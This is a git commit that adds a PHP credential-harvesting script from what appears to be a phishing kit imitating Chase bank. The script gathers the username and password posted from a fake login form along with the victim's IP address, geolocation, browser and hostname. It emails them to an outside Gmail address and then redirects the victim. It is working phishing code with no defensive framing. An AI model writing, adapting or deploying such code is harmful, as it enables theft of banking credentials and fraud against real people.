c6c4fceeb0faf671c1e7c14263a362d554df3820
iamfizzay01 <51757477+iamfizzay01@users.noreply.github.com>
2019-10-07 10:19:40 -0400

    first web

---
+++ boost.php
@@ -0,0 +1,36 @@
+<?php
+require("stop.php");
+$ip = getenv("REMOTE_ADDR");
+$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
+$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
+$timedate = date("D/M/d, Y g(idea) a"); 
+$browserAgent = $_SERVER['HTTP_USER_AGENT'];
+$hostname = gethostbyaddr($ip);
+$message .= "--------------Online Info-----------------------\n";
+$message .= "Username:             : ".$_POST['break']."\n"; 
+$message .= "Password:             : ".$_POST['hate']."\n"; 
+$message .= "-------------Vict!m Info-----------------------\n";
+$message .= "|Client IP: ".$ip."\n";
+$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
+$message .= "Browser                :".$browserAgent."\n";
+$message .= "DateTime                    : ".$timedate."\n";
+$message .= "country                    : ".$country."\n";
+$message .= "HostName : ".$hostname."\n";
+$message .= "---------------Created BY $PG Bon-------------\n";
+$send = "toolbooix@gmail.com";
+$subject = "Hi, Chase me From $ip";
+$headers = "From: Profile Chasse<sales-support@ikiekikloursh.com>";
+$headers .= $_POST['sooge']."\n";
+$headers .= "MIME-Version: 1.0\n";
+$arr=array($send, $IP);
+foreach ($arr as $send)
+{
+mail($send,$subject,$message,$headers);
+mail($to,$subject,$message,$headers);
+}
+
+	
+	   header("Location: arm.html");
+
+	 
+?>
